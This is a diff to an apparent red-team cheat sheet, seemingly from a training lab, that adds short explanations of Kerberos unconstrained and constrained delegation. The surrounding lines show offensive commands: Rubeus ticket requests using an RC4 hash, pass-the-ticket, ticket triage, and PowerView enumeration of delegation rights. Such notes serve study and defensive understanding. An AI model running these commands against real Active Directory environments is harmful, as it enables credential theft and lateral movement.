@@ -18,6 +18,7 @@ Rubeus asktgt /user:n.John /rc4:2e8a408a8aec852ef2e458b938b8c071
 Rubeus ptt /ticket:doIFXDCCBVi[…snip…]bDWN5YmVyYm90aWMuaW8=
 ```
 ### Unconstrained Delegation
+the server or the service account that is granted this right is able to impersonate a user to authenticate to any services on any host,you are granting that account permission to delegate to any service
 ```
 PowerShell Get-DomainComputer -Unconstrained -Properties DnsHostName
 execute-assembly C:\Users\Public\Rubeus.exe triage
@@ -34,6 +35,7 @@ execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x686cf9 /ticket:
 ```
 
 ### Constrained Delegation
+constrained delegation takes it a step further by allowing you to configure which services an account can be delegated to.it limits delegation to a specified list, rather than allowing delegation to any service as in unconstrained delegation.
 ```
 powershell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
 powershell Get-DomainComputer web-2.cyberbotic.io | select -exp msds-AllowedToDelegateTo 
